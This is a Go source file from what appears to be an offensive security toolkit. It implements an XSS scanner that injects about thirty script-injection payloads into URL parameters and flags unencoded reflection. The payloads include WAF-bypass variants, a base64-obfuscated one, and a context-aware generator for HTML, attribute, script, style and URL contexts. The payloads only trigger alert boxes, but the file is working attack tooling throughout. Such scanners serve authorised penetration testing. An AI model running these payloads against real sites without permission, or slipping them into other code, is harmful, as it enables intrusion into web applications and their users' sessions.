package web

import (
	"fmt"
	"io"
	"net/url"
	"strings"

	"github.com/nexus-void/nexus-void/pkg/utils"
)

// XSSHunter is the main XSS testing engine
type XSSHunter struct {
	Target string
}

// XSSResult represents a confirmed XSS finding
type XSSResult struct {
	URL        string `json:"url"`
	Parameter  string `json:"parameter"`
	Type       string `json:"type"` // reflected, stored, dom, blind
	Payload    string `json:"payload"`
	Context    string `json:"context"` // html, attribute, script, style, url
	Proof      string `json:"proof"`
	Severity   string `json:"severity"`
	Confidence int    `json:"confidence"` // 0-100
}

func NewXSSHunter(target string) *XSSHunter {
	return &XSSHunter{Target: target}
}

// TestURL tests a URL for XSS vulnerabilities
func (x *XSSHunter) TestURL(targetURL string, params []string) []XSSResult {
	fmt.Printf("[+] XSS-HUNTER scanning: %s\n", targetURL)

	var results []XSSResult

	if len(params) == 0 {
		params = discoverParameters(targetURL)
	}

	for _, param := range params {
		// Test reflected XSS
		if r := x.testReflected(targetURL, param); r != nil {
			results = append(results, *r)
		}
	}

	fmt.Printf("[+] XSS-HUNTER found %d XSS vulnerabilities\n", len(results))
	return results
}

func (x *XSSHunter) testReflected(targetURL, param string) *XSSResult {
	// Polyglot payloads that work in multiple contexts
	polyglotPayloads := []string{
		`<script>alert('XSS')</script>`,
		`"><script>alert('XSS')</script>`,
		`'><script>alert('XSS')</script>`,
		`javascript:alert('XSS')`,
		`<img src=x onerror=alert('XSS')>`,
		`<svg onload=alert('XSS')>`,
		`<body onload=alert('XSS')>`,
		`<iframe src=javascript:alert('XSS')>`,
		`<object data=javascript:alert('XSS')>`,
		`<embed src=javascript:alert('XSS')>`,
		`<form action=javascript:alert('XSS')><input type=submit>`,
		`<input type=text value="" onfocus=alert('XSS') autofocus>`,
		`<marquee onstart=alert('XSS')>`,
		`<details open ontoggle=alert('XSS')>`,
		`<select onfocus=alert('XSS') autofocus>`,
		`<video src=x onerror=alert('XSS')>`,
		`<audio src=x onerror=alert('XSS')>`,
		`<track src=x onerror=alert('XSS')>`,
		`<source src=x onerror=alert('XSS')>`,
		`onmouseover=alert('XSS')`,
		`onmouseenter=alert('XSS')`,
		`onclick=alert('XSS')`,
		`onerror=alert('XSS')`,
		// WAF bypass payloads
		`<scr<script>ipt>alert('XSS')</scr</script>ipt>`,
		`<img src=x oNerror=alert('XSS')>`,
		`<svg/onload=alert('XSS')>`,
		`<img src=x onerror=eval(atob('YWxlcnQoJ1hTUycp'))>`, // base64 encoded alert('XSS')
		`<iframe srcdoc="<script>alert('XSS')</script>">`,
		`<math><mtext></mtext><mAction class="**/*" actiontype="statusline#https://google.com" onclick="alert('XSS')">click`,
	}

	for _, payload := range polyglotPayloads {
		injectedURL := injectPayload(targetURL, param, payload)
		resp, err := utils.Fetch(injectedURL, nil)
		if err != nil {
			continue
		}

		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()
		bodyStr := string(body)

		// Check if payload is reflected without encoding
		if strings.Contains(bodyStr, payload) {
			return &XSSResult{
				URL:        targetURL,
				Parameter:  param,
				Type:       "reflected",
				Payload:    payload,
				Proof:      "Payload reflected in response without encoding",
				Severity:   "high",
				Confidence: 90,
			}
		}

		// Check for partial reflection (context matters)
		cleanPayload := strings.ReplaceAll(payload, "<", "")
		cleanPayload = strings.ReplaceAll(cleanPayload, ">", "")
		if strings.Contains(bodyStr, cleanPayload) && strings.Contains(bodyStr, "alert") {
			return &XSSResult{
				URL:        targetURL,
				Parameter:  param,
				Type:       "reflected",
				Payload:    payload,
				Proof:      "Payload partially reflected - context-dependent XSS",
				Severity:   "high",
				Confidence: 75,
			}
		}
	}

	return nil
}

func discoverParameters(targetURL string) []string {
	u, err := url.Parse(targetURL)
	if err != nil {
		return []string{"q", "search", "id", "page", "url", "redirect", "return", "next", "ref"}
	}

	var params []string
	for key := range u.Query() {
		params = append(params, key)
	}

	if len(params) == 0 {
		return []string{"q", "search", "id", "page", "url", "redirect", "return", "next", "ref",
			"name", "email", "message", "comment", "content", "text", "query"}
	}

	return params
}

// XSSPolyglotGenerator creates context-aware XSS payloads
func XSSPolyglotGenerator(context string) []string {
	switch context {
	case "html":
		return []string{
			`<script>alert('XSS')</script>`,
			`<img src=x onerror=alert('XSS')>`,
			`<svg onload=alert('XSS')>`,
		}
	case "attribute":
		return []string{
			`" onerror=alert('XSS') `,
			`' onerror=alert('XSS') `,
			`javascript:alert('XSS')`,
		}
	case "script":
		return []string{
			`;alert('XSS');//`,
			`'-alert('XSS')-'`,
			`</script><script>alert('XSS')</script>`,
		}
	case "style":
		return []string{
			`</style><script>alert('XSS')</script>`,
			`expression(alert('XSS'))`,
		}
	case "url":
		return []string{
			`javascript:alert('XSS')`,
			`data:text/html,<script>alert('XSS')</script>`,
		}
	default:
		return []string{
			`<script>alert('XSS')</script>`,
			`<img src=x onerror=alert('XSS')>`,
		}
	}
}
